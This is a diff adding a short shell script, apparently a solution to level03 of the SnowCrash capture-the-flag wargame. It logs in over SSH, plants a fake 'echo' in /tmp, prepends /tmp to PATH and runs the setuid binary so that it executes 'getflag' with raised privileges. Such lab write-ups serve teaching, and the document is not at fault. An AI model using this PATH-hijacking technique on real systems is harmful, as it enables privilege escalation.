@@ -1,0 +1,6 @@
+ssh level03@$SNOWCRASH_IP -p 4242 '
+	echo 'getflag' > /tmp/echo
+	chmod +x /tmp/echo
+	export PATH=/tmp:$PATH
+	./level03
+'
